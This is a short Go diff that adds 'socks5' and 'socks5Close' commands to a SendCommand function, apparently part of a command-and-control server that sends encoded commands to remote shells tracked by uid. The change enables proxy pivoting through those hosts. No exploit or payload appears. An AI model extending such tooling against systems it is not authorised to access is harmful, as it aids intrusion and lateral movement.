@@ -113,6 +113,15 @@ func SendCommand(uid string, command string) {
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.FileContent))
 		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
+	} else if strings.HasPrefix(command, "socks5 ") {
+		cmd := strings.TrimPrefix(command, "socks5 ")
+		cmdTypeBytes := make([]byte, 4)
+		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.Socks5Start))
+		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
+	} else if strings.HasPrefix(command, "socks5Close") {
+		cmdTypeBytes := make([]byte, 4)
+		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.Socks5Close))
+		byteToSend = cmdTypeBytes
 	} else if strings.HasPrefix(command, "clear") {
 		var shell database.Shell
 		database.Engine.Where("uid = ?", uid).Get(&shell)
